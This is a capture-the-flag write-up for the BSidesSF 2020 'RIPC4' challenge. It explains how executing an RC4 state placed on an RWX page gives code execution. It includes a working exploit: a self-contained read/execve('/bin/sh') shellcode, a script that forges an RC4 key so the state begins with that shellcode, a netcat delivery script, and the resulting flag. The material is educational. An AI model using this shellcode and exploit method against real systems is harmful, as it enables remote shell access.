# RIPC4 - BSidesSF 2020 CTF (crypto/pwn, 484p, 3 solved)  
## Introduction

RIPC4 is a crypto/pwn task.

It consists of two files : `ripc4.c` and its compiled version, `ripc4`.

The binary can print a string, perform hex/base64 encoding or encrypt it with  
RC4.

## Source code analysis

The source code uses a structure with a function to perform base64 and hex  
encoding. There is no menu to print when encrypting with RC4. An union that  
contains the function or the RC4 state is used:

```c  
union {  
 void (*print_encoded)(const char *, size_t);  
 char *enc_state;  
};  
```

The RC4 encryption allocates its state with `secure_malloc`. This function  
allocates a new memory page as `PROT_RW`.

`PROT_RW` is set to `PROT_READ | PROT_WRITE | PROT_EXEC`, so `secure_malloc`  
will allocate a page that is readable, writable and executable.

```c  
#define PROT_MASK (PROT_READ|PROT_WRITE|PROT_EXEC)  
#define PROT_RW (PROT_MASK|PROT_READ|PROT_WRITE)  
```

On top of that, even though `print` does not appear in the menu, it is
possible  
to use it with RC4. This will execute the RC4 state as a shellcode.

## Shellcode

RC4's state is of size 256. It contains every bytes between 0x00 and 0xFF  
(included). It is not possible to have the same byte twice.

This will cause a problem because `/bin/sh` contains two `/`. It requires the  
shellcode to modify itself. Using 64-bits registers will cause an other
problem  
because instructions will be prefixed with `48`.

The easiest way to overcome these problem is to write a short shellcode that  
calls `read` to read a second-stage shellcode that will be free of any  
constraints.

```assembler  
31 ff       xor    edi,edi  
f7 e7       mul    edi  
48 89 ce    mov    rsi,rcx // rcx contains the begining of this rwx page  
b6 04       mov    dh,0x4  
0f 05       syscall // read(0, page, 0x400)  
```

The crypto guy wrote a script to find an RC4 key that will generate an RC4  
state starting with a specific shellcode (cf. crypto.py)

The second stage shellcode is a classic `execve("/bin/sh", NULL, NULL)`  
shellcode. It has to be padded with the size of the first shellcode.

```assembler  
48 8d 3d 0a 00 00 00   lea    rdi,[rip+data]  
31 f6                  xor    esi,esi  
31 d2                  xor    edx,edx  
31 c0                  xor    eax,eax  
b0 3b                  mov    al,0x3b  
0f 05                  syscall

data:  
2f 62 69 6e            "/bin"  
2f 73 68 00            "/sh\0"  
```

Everything can be put together. The flag is located in `/home/ctf/flag.txt`.

```  
$ ./pwn.sh  
type (plain, encoded, encrypted)>  
set_input   : Set the input value  
set_key     : Set the RC4 key.  
encrypt     : Perform encryption.  
quit        : Quit the Program

command> key (hex)> Key has been set.

set_input   : Set the input value  
set_key     : Set the RC4 key.  
encrypt     : Perform encryption.  
quit        : Quit the Program

command> id  
uid=1000(ctf) gid=1000(ctf) groups=1000(ctf)  
cat /home/ctf/flag.txt  
CTF{R.I.P_RC4_u_were_fun_while_it_lasted}  
```

**Flag**: `CTF{R.I.P_RC4_u_were_fun_while_it_lasted}`

## Appendices

### crypto.py  
```python  
import random

state = range(256)  
target = range(256)

shellcode = [0x31, 0xff, 0xf7, 0xe7, 0x48, 0x89, 0xce, 0xb6, 0x04, 0x0f, 0x05]  
target = filter(lambda c: not c in shellcode, target)

random.shuffle(target)#state)  
target = shellcode + target

print(state)  
print(target)

key = ''  
jval = 0

for i in range(256):  
   tnode = target[i]  
   tgval = state.index(tnode)  
   oldjval = jval  
   res = tgval  
   res += 1024  
   res -= jval  
   res -= state[i]  
   jval = tgval & 0xFF  
   key += hex(res & 0xFF)[2:].zfill(2)  
   assert (oldjval + state[i] + int(key[-2:], 16)) & 0xFF == jval  
   state[i], state[jval] = state[jval], state[i]

print(key)  
```

### pwn.sh  
```sh  
#!/bin/sh  
(  
echo encrypted  
echo set_key  
echo
31cdf6ed5d3c3fe18abe70a15dc174d991fa989bbd8c7f3e62a2d913fb185e0c52e13c1fd04a26dd64f57ec57761fedd8e8223e83de793085c3af9a28509c89dea6fd99eedd98ec407ee380dd3b9f796d1713754abe368b621a35cbcf176600a92fb50f267b9ace97da8c3c6dd73bd6756686e458896cf7b8fc7b527f1bda8981fd3aebc95a083aa8cd94aaf999aff4994c2b2c612ffa8891d9fbcb1231f45c9d85bdc5561c21a57d5647b52babf93609bbb23b4254b293b633f5d542a78c2d5879146a96d4f7c4c95b351b7b947037add50d4a33bd67185289328419bc5ad5bf9d0d0d946cdae9a10db2167e9f885a76a22e0c121dac6dca09e4f689966b5b3  
echo print

sleep 1

printf '90 90 90 90 90 90 90 90 90 90 90 31 f6 f7 e6 48 8d 3d 04 00 00 00 b0 3b 0f 05 2f 62 69 6e 2f 73 68 00' | xxd -r -ps  
cat -) | nc ripc4-42d6573e.challenges.bsidessf.net 8267  
```

Original writeup
(https://github.com/TFNS/writeups/tree/master/2020-02-23-BSidesSF/ripc4/README.md).